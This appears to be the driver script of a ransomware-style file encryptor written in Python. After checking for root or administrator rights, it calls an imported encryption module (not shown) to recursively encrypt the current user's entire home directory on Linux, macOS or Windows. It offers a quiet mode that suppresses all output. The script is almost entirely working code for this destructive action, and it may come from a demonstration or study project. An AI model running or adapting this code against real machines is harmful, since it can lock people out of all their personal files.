from mods.encryption import encryption_
import os,argparse

pw = b""
salt = b""

def main():
    global pw
    global salt
    parser = argparse.ArgumentParser()
    parser.add_argument("-q","--quiet",action="store_true",help="Run quietly without output")
    parser.add_argument("-p","--password",required=True,help="Encryption password")
    parser.add_argument("-s","--salt",required=True,help="Encryption salt") 
    
    args = parser.parse_args()
    forSysPath = encryption_.encryption_.getsys()
    pw = args.password.encode()
    salt = args.salt.encode()

    if forSysPath not in ["win","invalid"]:
        if not os.geteuid() == 0:
            if not args.quiet:
                print("This script must be run with sudo/as root to encrypt files recursively!")
            exit(1)
        match forSysPath:
            case "lin":
                encryption_.encryption_.encrypt(f"/home/{os.getlogin()}", pw, salt, args)
            case "mac":
                encryption_.encryption_.encrypt(f"/Users/{os.getlogin()}", pw, salt, args)
            case _:
                print(f"Unknown OS: {forSysPath}")

    elif forSysPath == "win":
        if not encryption_.encryption_.isAdmin():
            if not args.quiet:
                print("This script must be run with sudo/as root to encrypt files recursively!")
            exit(1)
        encryption_.encryption_.encrypt(f"C:\\Users\\{os.getlogin()}", pw, salt, args)



if __name__ == "__main__":
    main()